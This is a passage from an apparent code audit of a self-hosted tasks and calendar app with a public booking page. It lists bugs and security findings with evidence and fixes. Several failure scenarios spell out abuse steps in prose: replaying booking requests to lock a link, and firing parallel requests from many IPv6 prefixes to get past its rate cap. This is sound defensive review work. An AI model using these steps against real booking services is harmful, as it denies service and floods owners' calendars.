        # Charged here: the booking landed on the owner's calendar.
        public_post_link_limiter.record_failure(f"link:{token}")
```
service.py:725-729 (the path that returns non-None without writing anything):
```python
            if client_id:
                prior = store.get_booking_by_event(self._conn, f"{client_id}@tasksd")
                if prior is not None:
                    if prior["link_token"] == token:
                        return self._confirmation(link, prior)
```
Failure scenario: owner publishes https://host/book/<tok> (public by design). Mallory books one real slot with client_id C — 201, 1 credit spent, 1 event created. She then re-POSTs the identical body (same C) 29 more times; each hits the replay branch, returns 201, creates no event, and spends a credit. `public_post_link_limiter` (max_fails=30, window_s=3600, lockout_s=1800) locks `link:<tok>`, and every real visitor's POST gets 429 "too many requests". The per-client limiter caps her at 15/h per IPv6 /64, so two /64s from one VPS sustain 30 replays an hour indefinitely — the link stays dead, the owner's calendar shows exactly one event, and nothing in the logs looks like an attack.
No test covers 
```

</details>

**Suggested fix.** Have `book_slot` distinguish a replay from a new booking (e.g. return `(dto, created:
bool)` or set a `replayed` key on the confirmation) and only call
`public_post_link_limiter.record_failure` when a VEVENT was actually written. Add a test
that books once, replays 40 times, and asserts a different client can still book.

#### [x] The per-link booking ceiling is a check-then-act: concurrent POSTs all pass the gate before any of them charges, so the 30/hour cap never engages

`backend/tasksd/app.py:1258` (`_gate`) · **medium** · security

`_gate` is documented as "Refuse if the key is already locked out. Spends nothing." It
runs synchronously in the handler, but the charge (`record_failure`) only happens after
`await _run(_svc(request).book_slot, ...)`. Every request that arrives while earlier
ones are inside `book_slot` therefore sees a counter that has not moved, so an arbitrary
number of concurrent bookings pass the gate together. This is exactly the bypass the
login route was fixed for — app.py:992-996 reserves the attempt before the awaited hash
and its comment claims "Same reserve-first shape the public booking routes already use
in _throttle" — but the per-link ceiling no longer has it. The cap's stated job
(app.py:1054-1058: "an attacker with many prefixes/botnet nodes gets a fresh counter
each — this cap bounds the total junk-event rate a single link can produce regardless of
source") is defeated by simply sending the requests in parallel.

<details><summary>Evidence</summary>

```
app.py:1069-1080 and 1093-1121:
```python
    def _gate(key: str, limiter: RateLimiter) -> None:
        """Refuse if the key is already locked out. Spends nothing."""
        if not limiter.allowed(key): raise HTTPException(429, ...)
...
        _public_throttle(request, public_post_limiter)
        _gate(f"link:{token}", public_post_link_limiter)   # read-only
        ...
        result = await _run(_svc(request).book_slot, ...)  # yields the loop
        ...
        public_post_link_limiter.record_failure(f"link:{token}")  # charged only here
```
Failure scenario: attacker holds the published token and 300 source addresses (one VPS /48 = 65 536 IPv6 /64s, and `limiter_key` collapses to the /64). She opens 300 concurrent `POST /api/public/booking/<tok>/book` connections for 300 distinct free slots. All 300 handlers run `_gate` on the event loop before any of them reaches `record_failure`, so `link:<tok>` is at 0 fails for all of them; they then serialize on `TaskService._lock` and each writes a real VEVENT. Result: ~300 junk events on the owner's real calendar in one burst against a ceiling of 30/hour. `test_the_per_link_ceiling_still_bounds_real_bookings` books strictly sequentially, so the suite cannot see this.
```

</details>

**Suggested fix.** Reserve the link credit before the await and release it when no booking landed — e.g.
give `RateLimiter` a `release(key)`/`refund(key)` and do `attempt(f"link:{token}")` up
front, `release` on SlotTaken/422/404/replay. That keeps the DoS fix (refused requests
cost nothing) while restoring the reserve-before-await property. Add a concurrent-burst
test (e.g. 60 parallel POSTs from distinct X-Real-IPs) asserting at most 30 land.

#### [x] The public booking POST mints a fresh client_id on every attempt, so a lost response turns one booking into two and tells the visitor their own slot "was just taken"

`frontend/src/components/BookingPage.tsx:87` (`submit`) · **medium** · bug

`submit()` calls `api.publicBook`, and `api.publicBook` builds the body as `{ client_id:
clientId(), ...body }` (api.ts:318-320) — a brand-new random id per call. On any failure
the page keeps `phase='confirm'` with the slot still selected and re-enables the button,
so retrying is the obvious (and only) action. But `fetch` rejects both when the write
never landed *and* when the response was lost after the CalDAV PUT committed, so the
retry replays the intent under a different idempotency key and the backend's whole
replay mechanism (`store.get_booking_by_event` on `{client_id}@tasksd`,
service.py:725-729) is unreachable from the real client. The same class of bug was fixed
for `TasksView.createMany` (stable per-row `cid`, TasksView.tsx:193-207), but this — the
unauthenticated write path — still mints inline.

<details><summary>Evidence</summary>

```
BookingPage.tsx:86-103:
```tsx
      const r = await api.publicBook(token, {
        start: slot.start, name: name.trim(), email: email.trim(),
        notes: notes.trim() || undefined,
      })
      ...
    } catch (e) {
      const msg = e instanceof Error ? e.message : String(e)
      if (/not available/i.test(msg)) {
        setError('That time was just taken — please pick another.')
```
api.ts:318-320:
```ts
  publicBook: (token, body) => j<PublicBookingResult>('POST',
      `/api/public/booking/${encodeURIComponent(token)}/book`, { client_id: clientId(), ...body }),
```
Failure scenario: visitor picks 14:00 and presses Confirm over the Cloudflare Tunnel. The POST reaches the backend, `book_slot` writes the VEVENT to the owner's calendar and inserts the ledger row, then the tunnel drops the response. `fetch` rejects → `setError('Failed to fetch')`, button re-enabled, slot still selected. The visitor presses Confirm again → new client_id → `book_slot` re-validates → 14:00 is now blocked by *their own* just-created event → `SlotTaken` → 409 → the page says "That time was just taken — please pick another." They pick 15:00 and book it. The owner ends up with two events and two ledger rows for one person, and the visitor believes only the 15:00 one exists. BookingPage.test.tsx never exercises a retry after a failed submit.
```

</details>

**Suggested fix.** Mint the client_id once per chosen slot (e.g. `setSlot(s); setCid(clientId())` in the
slot button's onClick) and pass it explicitly through `api.publicBook`'s body so a retry
of the same slot replays the same id and hits the server's replay path. Re-mint only
when the visitor changes slot. Add a test that fails the first `publicBook` with a
network Error, retries, and asserts the same `client_id` is sent.

#### [x] A dense recurring series stops blocking bookings past 750 occurrences, so the public page advertises the owner's busy hours as free

`backend/tasksd/service.py:691` (`_link_busy`) · **medium** · bug

`_link_busy` builds the conflict set by calling `events_in_range` over the link's whole
horizon, which fans recurring masters out through `recur.expand_occurrences`. That
function silently truncates at `max_occurrences=750` (recur.py:203, 233-235) — it does
not raise, so `events_in_range`'s try/except never fires and the caller has no idea the
series was cut short. Meanwhile `recur._pathological_rule` deliberately *permits* up to
`_MAX_PER_DAY = 24` instances/day ("Hourly (24) is the densest shape a person plausibly
puts on a calendar"). The two limits are inconsistent: an hourly series overruns 750 in
about 31 days, so every occurrence past that point is invisible to the busy check and
the slots sitting on top of them are advertised — and bookable — as free.

<details><summary>Evidence</summary>

```
service.py:637-647:
```python
        start_iso = (window.start - timedelta(days=1)).replace(tzinfo=None).isoformat()
        end_iso = (window.end + timedelta(days=1)).replace(tzinfo=None).isoformat()
        ...
                events.extend(self.events_in_range(row["href"], start_iso, end_iso))
        return scheduling.busy_intervals(events, tz)
```
recur.py:233-235 (truncation, no signal):
```python
        out.append(occ)
        if len(out) >= max_occurrences:
            break
```
Verified against the real module with an `RRULE:FREQ=HOURLY` VEVENT (accepted by `_pathological_rule`: per_day == 24 == _MAX_PER_DAY):
```
expand_occurrences(raw, 2026-07-01, 2026-08-01)  -> count 744, last 2026-07-31T23:00:00+00:00   # fits
expand_occurrences(raw, 2026-07-01, 2026-12-28)  -> count 750, last 2026-08-01T05:00:00+00:00   # 3642 occurrences dropped
```
Failure scenario: any CalDAV client sharing the collection (Thunderbird, DAVx5, a script) writes one `RRULE:FREQ=HOURLY` VEVENT. The owner has a link with `horizon_days=180`; `public_link_info` builds a ~183-day window, `_link_busy` gets only the first ~31 days of that series, and `GET /api/public/booking/<tok>` advertises every hour from August onward as free. An anonymous caller POSTs one of them, `book_slot` re-validates against the same truncated busy set, and the VEVENT lands directly on top of the owner's recurring commitment. Even at the default `horizon_days=30` the window is ~33 days (792 occurrences), so the last ~42 ho
```

</details>

**Suggested fix.** Make truncation loud instead of silent: have `expand_occurrences` raise (or return a
`truncated` flag) when it hits the cap, and in `_link_busy` treat a truncated series as
fully blocking (or chunk the horizon into sub-windows small enough that `_MAX_PER_DAY *
days < max_occurrences`). Add a test: an hourly series over a 180-day horizon must block
a slot on day 120.

#### [x] Floating (naive) event times are read in the link's timezone, so a link whose timezone differs from where events were authored silently double-books the owner

`backend/tasksd/scheduling.py:101` (`parse_event_time`) · **medium** · bug

`parse_event_time` stamps every naive cached `dtstart`/`dtend` with the *link's* zone.
Naive strings are precisely this app's own writes: `_event_dt` -> `_parse_datelike`
yields a naive datetime for a non-all-day event, `build_new_event` emits floating
`DTSTART:20260810T090000`, and the cache stores it naive. The link timezone, however, is
a free-text field the owner sets per link (SchedulingView.tsx:197/225 defaults to the
browser zone but accepts anything). When the two differ, every one of the owner's own
floating events is placed at the wrong absolute instant in the busy set — by exactly the
offset difference — so the real conflict window is advertised as free and an
unauthenticated caller can book straight over it.

<details><summary>Evidence</summary>

```
scheduling.py:82-87:
```python
def parse_event_time(iso: str, tz: ZoneInfo) -> datetime:
    dt = datetime.fromisoformat(iso)
    return dt.replace(tzinfo=tz) if dt.tzinfo is None else dt.astimezone(tz)
```
Failure scenario: owner lives in America/New_York. They create a link for European clients with `timezone: "Europe/London"` and availability `{"0".. : ["09:00-17:00"]}`. In the SPA they add "Dentist" 2026-08-10 09:00-10:00 — `POST /api/calendars/{id}/events {"start":"2026-08-10T09:00:00", ...}` -> floating `DTSTART:20260810T090000`, cached as `2026-08-10T09:00:00`. `busy_intervals(..., tz=Europe/London)` reads it as 09:00+01:00 = **08:00Z**, but the appointment is really 09:00 EDT = **13:00Z**. The 13:00Z slot (14:00 London) shows on the public page as free, `book_slot` re-validates against the same wrong busy set, and the booking VEVENT is written at 13:00Z — exactly on top of the dentist appointment. Symmetrically the genuinely free 08:00Z hour is blocked. Nothing warns the owner; `test_busy_intervals_naive_and_aware` only ever uses tz == the authoring zone.
```

</details>

**Suggested fix.** Interpret floating times in a single owner-local zone rather than the link's — e.g.
store an owner home timezone in settings and pass it to `busy_intervals` for the naive
branch, keeping the link zone only for availability-window math and display. Failing
that, refuse to save a link whose timezone differs from the owner's, or surface a
warning. Add a test with link tz != authoring tz asserting the busy block lands at the
authored instant.

#### [x] On the DST fall-back day the public page renders two identical slot buttons an hour apart, so the visitor can book the wrong hour with no way to tell

`frontend/src/components/BookingPage.tsx:214` (`fmtTime`) · **low** · rendering

Now that `generate_slots` correctly offers both passes of the repeated fall-back hour (a
deliberate fix — see docs/AUDIT.md and `test_fall_back_offers_the_repeated_hour`), the
public page renders each pass with `fmtTime`, which shows only `hour`/`minute`. For a
visitor in a zone with the same transition (i.e. most of them — the link is usually
shared within a country) both slots print the same label, and the confirmation screen
and the "Confirmed" card use the same formatter, so nothing ever disambiguates them.

<details><summary>Evidence</summary>

```
BookingPage.tsx:15-16 and 210-216:
```tsx
const fmtTime = (iso: string) =>
  new Date(iso).toLocaleTimeString(undefined, { hour: 'numeric', minute: '2-digit' })
...
              {(slotsByDay.get(selDay) ?? []).map((s) => (
                <button key={s.start} className="slot-btn" onClick={() => { setSlot(s); setPhase('confirm') }}>
                  {fmtTime(s.start)}
                </button>
```
Verified with TZ=America/Chicago on the exact ISO strings the backend emits for 2026-11-01:
```
2026-11-01T01:00:00-05:00 => 1:00 AM
2026-11-01T01:00:00-06:00 => 1:00 AM
2026-11-01T01:30:00-05:00 => 1:30 AM
2026-11-01T01:30:00-06:00 => 1:30 AM
```
`localDay` groups all four under 2026-11-01, so the day panel shows "1:00 AM", "1:00 AM", "1:30 AM", "1:30 AM". The visitor picks one at random, the confirm bar repeats the same ambiguous label, and the "Confirmed" card does too — a 50 % chance the meeting is an hour from when they think it is, and the owner has no signal either. BookingPage.test.tsx has no ambiguous-time fixture.
```

</details>

**Suggested fix.** When two slots in the rendered day format to the same label, include the zone
abbreviation — e.g. detect duplicates in `slotsByDay` and format those with `{
hour:'numeric', minute:'2-digit', timeZoneName:'short' }` ('1:00 AM CDT' / '1:00 AM
CST') — and use the same disambiguated formatter on the confirm bar and the confirmation
card. Add a test with the two fall-back slots asserting distinct button labels.


### Frontend core

#### [x] Dragging a zone-anchored event in the calendar rewrites DTSTART/DTEND as floating local wall time, destroying the TZID another CalDAV client wrote

`frontend/src/calendar.ts:26` (`shiftIso`) · **high** · bug

`shiftIso` (and the resize branch's `toLocalInput`) reduce every datetime to
`${ymd}T${HH}:${MM}` in the *viewer's* wall clock, with no offset. `dragBody` feeds that
straight into `api.patchEvent`. The backend's `_set_datelike`
(backend/tasksd/ical/edit.py:118-140) only re-expresses a value into the property's
original tzinfo when the incoming value is itself zone-aware — a naive string is written
verbatim, so `DTSTART;TZID=Europe/Berlin:...` becomes a floating `DTSTART:...`.
TasksView already solved exactly this for DUE (`TasksView.tsx:33`, `hasZone(original) ?
instantFromLocal(date, time) : ...` using the `hasZone`/`instantFromLocal` helpers that
exist in util.ts for this purpose); CalendarView's drag path never got the same
treatment, and neither `shiftIso` nor `dragBody` has a single test with a zoned input.
Both drag modes are affected: the resize branch also rewrites `start` via
`toLocalInput(ev.start)`, so a pure resize destroys the TZID too. This violates the
'never lose properties you did not author' invariant and, for a viewer whose zone
differs from the event's, silently moves the event by the offset difference.

<details><summary>Evidence</summary>

```
calendar.ts:25-29
  export const shiftIso = (v: string, n: number) => {
    if (!v.includes('T')) return shiftYmd(v, n)
    const d = addDays(parseDate(v), n)
    return `${ymd(d)}T${pad(d.getHours())}:${pad(d.getMinutes())}`   // <- offset dropped
  }
calendar.ts:119-120  body = { start: shiftIso(ev.start, delta) }; if (ev.end) body.end = shiftIso(ev.end, delta)
calendar.ts:126      const start = ev.all_day ? ev.start.slice(0, 10) : toLocalInput(ev.start)   // resize: same loss

End to end, verified against the real modules (viewer TZ=America/New_York, the suite's pinned zone):

Wire resource (Apple Calendar / DAVx5 shape):
  DTSTART;TZID=Europe/Berlin:20260810T093000
  DTEND;TZID=Europe/Berlin:20260810T103000
`read.extract_from_raw` serves it as start='2026-08-10T09:30:00+02:00', end='2026-08-10T10:30:00+02:00' (verified).

User drags the chip from Aug 10 to Aug 11 in the month grid (CalendarView.tsx:207 -> dragBody):
  node: shiftIso('2026-08-10T09:30:00+02:00', 1) -> '2026-08-11T03:30'
  PATCH body { start: '2026-08-11T03:30', end: '2026-08-11T04:30' }

Backend, verified by running apply_event_changes on that resource with those naive datetimes:
  AFTER: DTSTART:20260811T033000
  AFTER: DTEND:20260811T043000

The TZID is gone and, in Berlin's own terms, the 09:30 standup is now at 03:30 — a 6-hour move the user never asked for, permanently, on the source of truth, for every other CalDAV client. Same for a resize (which rewrites `start` from `toLocalInput`). Even for a sam
```

</details>

**Suggested fix.** Preserve the instant when the source value carries one, the way TasksView already does.
In `shiftIso`, when `hasZone(v)` is true, build the shifted value as an ISO instant
(`new Date(shifted).toISOString()`) instead of a floating wall-clock string; do the same
for the `start`/`end` the resize branch builds (`instantFromLocal(day, time)` when the
original had a zone). `_set_datelike` will then re-express it in the property's own
tzinfo and `DTSTART;TZID=Europe/Berlin` survives. Add table-driven cases to
calendar.test.ts for a `+02:00` start under TZ=America/New_York in both move and resize.

#### [x] useAllTasks never clears `loading` when a fetch fails, so the Home dashboard's task modules render permanently blank with no retry

`frontend/src/hooks.ts:46` (`useAllTasks`) · **medium** · bug · `minor`

**Closed by deleting the code.** `useAllTasks` had no callers left — HomeView
moved to `useTaskData()` from `data.tsx` in main's 2026-08-14 merge, and a
repo-wide grep found only the definition. The live equivalent was checked for
the same defect and does not have it: `data.tsx` clears its flag in a
`.finally`, so a failed fetch still ends the loading state. Fixing and testing a
hook nothing calls would have been coverage of dead code.

`setLoading(false)` is the last statement inside the guarded async body. `makeGuard`
swallows the rejection (toast + console) and returns undefined, so on any failure the
statement is never reached and `loading` stays `true` for the life of the hook.
HomeView's `TaskList` renders `if (loading && !items.length) return null`, so Today /
Overdue / Upcoming / Recently-completed render as empty module bodies — not the 'Nothing
due today.' empty state, not an error, just nothing. The only thing that re-runs the
effect is a `rev` bump, which only happens on a *server-side* data event over SSE; a
user who is only reading gets a blank dashboard indefinitely. The fan-out makes this
easy to hit: `Promise.all(ls.map(l => api.tasks(l.id)))` rejects if any single list's
request fails, so one 502 out of N kills the whole batch.

<details><summary>Evidence</summary>

```
hooks.ts:37-48
  useEffect(() => {
    const mine = ++token.current
    makeGuard(() => expire.current())(async () => {
      const ls = await api.lists()
      if (mine !== token.current) return
      setLists(ls)
      const ts = (await Promise.all(ls.map((l) => api.tasks(l.id)))).flat()
      if (mine !== token.current) return
      setTasks(ts)
      setLoading(false)          // <- unreachable on any rejection
    })
  }, [rev])

HomeView.tsx:334
  if (loading && !items.length) return null

Failure scenario: the user is on the Home tab with 6 task lists. The Cloudflare Tunnel drops one request and `api.tasks('work')` rejects (or returns 502 -> HttpError). `Promise.all` rejects -> makeGuard catches -> a toast appears for 6s -> `loading` is still true and `tasks` is still []. All four task modules render `null` bodies. No SSE data event ever arrives (the user is only reading), so `rev` never changes and the effect never re-runs: the dashboard stays blank until a manual page reload. Note the early `return` on a stale token has the same effect on the *first* load if two revs race.

There is no hooks.test.ts, so nothing catches it.
```

</details>

**Suggested fix.** Clear the flag unconditionally for the newest run: `makeGuard(...)(async () => { ...
}).finally(() => { if (mine === token.current) setLoading(false) })` (makeGuard's
promise always settles), and drop the `setLoading(false)` from inside the body. Consider
`Promise.allSettled` so one failing list does not blank the whole dashboard.

#### [x] A failed logout still shows the login form, leaving a live session and a valid cookie behind (and raises an unhandled rejection)

`frontend/src/App.tsx:411` (`onLogout`) · **medium** · security

`onLogout` puts `setAuth('out')` in a `finally`, so the UI reports a successful sign-out
whether or not the request landed, and it has no `catch`, so a rejection escapes an
async onClick handler as an unhandled promise rejection. `POST /api/logout` is the only
thing that revokes the session jti (app.py:1029-1034) and the only thing that clears the
HttpOnly cookie (`resp.delete_cookie`, app.py:1036) — the browser cannot clear it from
JS. So when the POST fails, the token stays valid for the rest of its TTL (7 days by
default) and the cookie stays in the jar, while the user is looking at the login card
and believes they are signed out. The trust model makes this cookie the entire
perimeter.

<details><summary>Evidence</summary>

```
App.tsx:314
  const onLogout = async () => { try { await api.logout() } finally { setAuth('out') } }

api.ts:230-243 — `j()` rejects for any non-2xx (HttpError / AuthError) and for a transport failure (fetch's own TypeError).

Failure scenario: the user clicks 'Log out' on a borrowed laptop just as the Cloudflare Tunnel reconnects; the POST comes back 502 (or the fetch rejects outright). `api.logout()` rejects -> `finally` runs `setAuth('out')` -> the login card renders -> the promise returned by the onClick handler rejects with nobody watching (window 'unhandledrejection'). The session jti was never revoked and `tasks_session` is still in the browser. The user walks away; the next person presses reload, `api.me()` succeeds against the still-valid cookie, and the app opens fully authenticated.

App.test.tsx:124-131 is the only logout test and it stubs `m.logout.mockResolvedValue({})`, so the failure path has no coverage.
```

</details>

**Suggested fix.** Await the logout and only tear down the UI on success: `try { await api.logout();
setAuth('out') } catch (e) { if (e instanceof AuthError) { setAuth('out'); return }
showToast("Couldn't sign out — you are still signed in on this device. Try again.") }`.
Add a test that rejects `api.logout` and asserts the shell stays mounted with a visible
error.

#### [x] A 422 from the API renders as the literal string "[object Object]", because FastAPI's validation detail is a list

`frontend/src/api.ts:275` (`j`) · **low** · rendering · `minor`

`j()` assigns `data.detail` to `msg` and passes it to `new HttpError(status, msg)` /
`new AuthError(msg)` without checking that it is a string. The app's own
RequestValidationError handler (backend/tasksd/app.py:623-636) answers every pydantic
failure with `{"detail": [ {type, loc, msg}, ... ]}` — an array. `Error`'s constructor
stringifies it, so the message becomes `"[object Object]"` and that is what reaches the
user: the login card (`Login.tsx:25` renders `(ex as Error).message` verbatim for
anything that is not an AuthError) and the settings toast (`App.tsx:163`, `Couldn't save
your preferences: ${e.message}`).

<details><summary>Evidence</summary>

```
api.ts:230-243
  if (!res.ok) {
    let msg = res.statusText
    try { const data = await res.json(); msg = data.detail || msg } catch { }
    if (res.status === 401) throw new AuthError(msg)
    throw new HttpError(res.status, msg)
  }

app.py:630-636 returns content={"detail": [ {"type":..., "loc":[...], "msg":...} ]} for every RequestValidationError.

Verified: node -e "new Error([{type:'string_too_long',loc:['body','password'],msg:'too long'}]).message" -> '[object Object]'.

Concrete trigger on an unauthenticated endpoint: Login.tsx puts no `maxLength` on either input, while `Login.password` is `Field(max_length=1024)` (app.py:62). A password manager auto-filling a >1024-char passphrase, or a paste, produces a 422 whose detail is the array above, and the login card displays 'errors' as the single line `[object Object]` with no hint of what is wrong. Same for a >256-char username.
```

</details>

**Suggested fix.** Coerce the detail to a string in `j()`: `const d = data?.detail; msg = typeof d ===
'string' ? d : Array.isArray(d) ? d.map((e) => `${(e.loc || []).slice(1).join('.')}:
${e.msg}`).join('; ') || msg : msg`. Add an api.test.ts case stubbing a 422 with an
array detail and asserting a readable message.

#### [x] bucketByDay sorts each day's events by raw ISO string, so a zone-anchored event lands in the wrong slot — and can be pushed out of the cell entirely

`frontend/src/calendar.ts:95` (`bucketByDay`) · **low** · rendering · `minor`

`evs.sort((a, b) => (a.start || '').localeCompare(b.start || ''))` compares the wire
strings, not the instants they name. Events written by another CalDAV client come back
with a UTC offset (`2026-08-03T19:00:00+01:00`), events the app wrote itself are
floating (`2026-08-03T16:00:00`); the lexicographic order of those two strings has
nothing to do with their local order whenever the offset differs from the viewer's.
CalendarView renders `dayEvents.slice(0, 4)` in array order (CalendarView.tsx:299) and
hides the rest behind '+N more', so the mis-sort does not only reorder chips — it can
push an earlier event out of the cell while a later one stays. HomeView's `dotColors`
walks the same array 'in the order its events start' (HomeView.tsx:359-373) and picks
the first 3 distinct colors, so the mini calendar can show the wrong calendars' dots.

<details><summary>Evidence</summary>

```
calendar.ts:94
  for (const evs of m.values()) evs.sort((a, b) => (a.start || '').localeCompare(b.start || ''))

Verified under TZ=America/New_York (the suite's pinned zone):
  A = '2026-08-03T19:00:00+01:00'   // DTSTART;TZID=Europe/London — 14:00 local
  B = '2026-08-03T16:00:00'         // floating — 16:00 local
  [A,B].sort((x,y)=>x.localeCompare(y)) -> ['2026-08-03T16:00:00', '2026-08-03T19:00:00+01:00']
  actual local starts:                     B = 16:00,               A = 14:00
So A (the earlier event) sorts after B.

With five events on that day, four of them floating between 15:00 and 22:00, the 14:00 London-anchored event sorts last, falls outside `dayEvents.slice(0, 4)`, and does not appear on the month grid at all — the user sees '+1 more' and four later events. The chip's own label is rendered from `new Date(e.start).toLocaleTimeString(...)` (CalendarView.tsx:317), i.e. correct local time, so the visible times read out of order.

calendar.test.ts:86-92 ('sorts each day by start time') uses only two floating same-offset strings, so nothing catches this.
```

</details>

**Suggested fix.** Sort on the parsed instant rather than the string, keeping all-day items first:
`evs.sort((a, b) => Number(!!a.start && a.start.includes('T')) - Number(!!b.start &&
b.start.includes('T')) || (a.start ? parseDate(a.start).getTime() : 0) - (b.start ?
parseDate(b.start).getTime() : 0))`. Add a test with a `+01:00` start and a floating
start under TZ=America/New_York.

#### [x] Test gap: hooks.ts has no test file, so useAllTasks' documented staleness guard and its loading contract are entirely unverified

`frontend/src/hooks.ts:29` (`useAllTasks`) · **low** · test-gap · `minor`

**Closed, narrowed to what survives.** `frontend/src/hooks.test.ts` now exists.
Three of the four cases the fix below asks for were about `useAllTasks`, which
was deleted as dead code (see the finding above), so the suite covers
`useIsMobile` instead — first read, following a `matchMedia` change, and
removing its listener on unmount. It decides which layout the whole app renders
and three components subscribe to it.

Every other non-trivial module in frontend/src has a sibling suite (api, util, calendar,
dashboard, tabs, appearance, App, and every component). hooks.ts has none. `useAllTasks`
is the Home tab's whole data path and carries a behaviour its own doc comment calls
load-bearing — 'a response commits only while its token is still the newest, which is
what stops a slow first load from clobbering a fast SSE-driven one'. That token
comparison, the ordering it protects, and the `loading` flag (which the same code leaks
on error — see the finding above) have zero coverage, so any of them can regress
silently. This is the same class of gap the audit already recorded and closed for
CalendarView.

<details><summary>Evidence</summary>

```
$ ls frontend/src/*.test.*
  App.test.tsx  api.test.ts  appearance.test.ts  calendar.test.ts  dashboard.test.ts  tabs.test.ts  util.test.ts
(no hooks.test.ts; `grep -rn useAllTasks frontend/src` hits only hooks.ts:29 and HomeView.tsx:3,102)

Untested behaviours with a concrete wrong answer today:
- `useAllTasks` after a rejected `api.lists()` leaves `loading === true` forever (HomeView then renders empty module bodies).
- Two rev bumps in flight: if the first batch settles second, the `mine !== token.current` early return is the only thing stopping it from committing the older snapshot — flip the comparison and no test fails.
- `expire.current = onExpire` is reassigned on every render so the guard never captures a stale onExpire; nothing asserts an AuthError from either `api.lists()` or the `api.tasks()` fan-out reaches `onExpire`.
```

</details>

**Suggested fix.** Add frontend/src/hooks.test.ts using @testing-library/react's renderHook with the api
module mocked: (1) a rejected `api.lists()` leaves `loading` false and `tasks` empty
(fails today); (2) rerender with a new `rev` while the first `api.lists()`/`api.tasks()`
promises are still pending, settle them out of order, and assert the newest batch's data
is what commits; (3) an AuthError from either call invokes `onExpire` exactly once; (4)
`useIsMobile` flips on a matchMedia change event and removes its listener on unmount.


### Tasks view

#### [x] "View completed" renders a completed subtask twice — once as a top-level row and again nested under its parent

`frontend/src/components/TasksView.tsx:257` (`tops`) · **medium** · rendering · `minor`

**Re-scoped, then fixed.** The duplicate is gone — `kidRows` (main's 2026-08-14
merge) only nests a task whose parent IS rendered, so the completed child was no
longer emitted twice. What survived is the other half of the same cause: it was
promoted to a top-level row *instead* of being nested, so the pane sat the child
beside the parent it belongs under and showed a flat list where a tree was
intended. The pane now has its own top-level set and its own children lookup,
neither of which consults `showCompleted` — which is the flag that never applied
to it in the first place.

`tops` treats a task as top-level when its parent is not rendered, and
`parentIsRendered` uses the global `showCompleted` flag: `return !!p && (showCompleted
|| !isDone(p))`. The dedicated Completed pane, however, renders `done` regardless of
`showCompleted`, so with the default `showCompleted={false}` a completed child of a
completed parent is BOTH promoted into `tops`/`done` (because its parent "isn't
rendered") AND rendered as a kid via `childrenOf(parent.uid)` inside its parent's
`<TaskGroup>`. The same task appears twice in the pane.

<details><summary>Evidence</summary>

```
TasksView.tsx:305-312
```ts
const byUid = new Map(shownTasks.map((t) => [t.uid, t] as const))
const parentIsRendered = (t: Task) => {
  const p = t.parent ? byUid.get(t.parent) : undefined
  return !!p && (showCompleted || !isDone(p))
}
const tops = shownTasks.filter((t) => !parentIsRendered(t))
...
const done = tops.filter((t) => t.completed || t.cancelled)
```
TasksView.tsx:333 and 390-397
```ts
const completedTasks = [...done].sort(byDue).reverse()
...
{completedTasks.map((t) => (
  <TaskGroup key={t.uid} task={t} kids={childrenOf(t.uid)} ... />
))}
```
Reproduced (vitest, default `showCompleted={false}`): tasks = [{uid:'p1', summary:'Trip planning', completed:true}, {uid:'c1', summary:'Book flight', parent:'p1', completed:true}]; click "View completed" -> `screen.getAllByText('Book flight')` returns **2** nodes. Rendered DOM: one `<div class="task done">Book flight</div>` at top level, then `<div class="task done">Trip planning</div>` followed by `<div class="task sub done">Book flight</div>`. The pane also claims `${completedTasks.length} completed` in the header, so the count is inflated by every completed subtask.
```

</details>

**Suggested fix.** Give the Completed pane its own top-level set instead of reusing `done`: a done task is
top-level there unless its parent is also done and present in `byUid`. E.g. `const
completedTops = shownTasks.filter((t) => isDone(t) && !(t.parent && byUid.get(t.parent)
&& isDone(byUid.get(t.parent)!)))` and sort that. Add a test asserting
`getAllByText('Book flight')` has length 1 in the pane.

#### [x] A multi-line paste retitles a bulk row but keeps its client_id, so retrying after a lost response silently discards the new title

`frontend/src/components/AddMultipleModal.tsx:341` (`onPasteTitle`) · **medium** · bug · `minor`

`patchRow` deliberately mints a fresh `cid` when a row's summary changes, because the
server answers a replayed slug by confirming the resource already written under it.
`onPasteTitle` writes `summary` directly into the row and bypasses that rule, so a row
that failed (kept, with its original cid) and is then corrected by a multi-line paste
replays the OLD idempotency slug with a NEW title.

<details><summary>Evidence</summary>

```
AddMultipleModal.tsx:284-292 (the rule)
```ts
const retitled = patch.summary !== undefined && patch.summary !== r.summary
return { ...r, ...patch, ...(retitled ? { cid: clientId() } : {}) }
```
AddMultipleModal.tsx:347-351 (the bypass)
```ts
lines.forEach((summary, i) => {
  const at = index + i
  if (at < next.length) next[at] = { ...next[at], summary }   // <- cid preserved
  else next.push({ ...blankRow(defaultList), summary })
})
```
Backend confirms the replay semantics — `engine._put_new` (backend/tasksd/sync/engine.py:269-284) swallows the PreconditionFailed when the occupant has the same UID, i.e. "the create succeeding", and `create_task` returns the existing resource.

Reproduced (vitest): submit row 1 "alpha" -> onSubmit reports index 0 failed -> row kept with cid `4815…c833`. Click into row 1 and paste "alpha fixed\nbravo" (row 1 becomes "alpha fixed"). Press Add -> the retry sends `{summary:'alpha fixed', cid:'4815…c833'}` — the identical cid. Real-world: the first POST actually landed and only the response was lost over the tunnel, so the retry PUTs to the same href, Radicale answers 412, `_put_new` treats it as success, and the user gets the old "alpha" task while the UI paints it as their corrected one.
```

</details>

**Suggested fix.** Regenerate the cid in the paste path too: `next[at] = { ...next[at], summary,
...(summary !== next[at].summary ? { cid: clientId() } : {}) }`. Extend the existing
"mints a new client_id when the row is retitled before the retry" test with a paste-
driven retitle.

#### [x] Turning Tags into a shared property silently drops the tag already typed into a row (array compared by reference)

`frontend/src/components/AddMultipleModal.tsx:382` (`toggleShared`) · **medium** · bug · `minor`

`toggleShared` adopts a value already typed per-row when a property becomes shared — "so
'I set row 1's due date, then made due shared' doesn't silently lose it". Both halves of
the guard compare slot values with `!==` / `===`, which is a reference comparison for
the `tags` slot (`string[]`). `shared.tags === blank.tags` is always false, so
`f.slots.every(...)` is always false and the adoption branch never runs for Tags — the
exact loss the function exists to prevent.

<details><summary>Evidence</summary>

```
AddMultipleModal.tsx:375-384
```ts
const blank = blankValues(defaultList)                     // tags: [] — a fresh array
const donor = rows.find((r) => f.slots.some((s) => r[s] !== blank[s]))
if (donor && f.slots.every((s) => shared[s] === blank[s])) {
  setShared((v) => ({ ...v, ...Object.fromEntries(f.slots.map((s) => [s, donor[s]])) }))
}
```
